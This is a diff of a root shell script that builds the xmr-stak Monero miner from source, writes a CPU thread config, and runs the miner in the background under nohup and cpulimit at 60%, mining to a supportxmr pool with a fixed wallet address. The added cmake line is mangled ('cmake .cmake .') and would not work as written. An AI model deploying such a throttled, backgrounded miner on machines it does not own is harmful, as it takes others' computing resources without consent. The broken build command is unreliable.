@@ -16,5 +16,20 @@ apt install -y libmicrohttpd-dev libssl-dev libhwloc-dev
 git clone https://github.com/fireice-uk/xmr-stak.git
 mkdir xmr-stak/build
 cd xmr-stak/build
-cmake ..
+cmake .cmake . -DCUDA_ENABLE=OFF  -DOpenCL_ENABLE=OFF
 make install
+
+#My cpu.txt
+cat <<EOF >> /root/xmr-stak/build/bin/cpu.txt
+"cpu_threads_conf" :
+[
+    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },
+
+],
+EOF
+
+#Run xmr-stak and cpulimit
+cpulimit --exe xmr-stak --limit 60 -b
+nohup /root/xmr-stak/build/bin/xmr-stak -o us-backup.supportxmr.com:3333 -u 41j3DkPVeJkZvfq9q7Zf6DRB1rg5HmZy426GKs1wRdFpSMZLgSqVAFUjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hjFYhF -p dog &
+
+
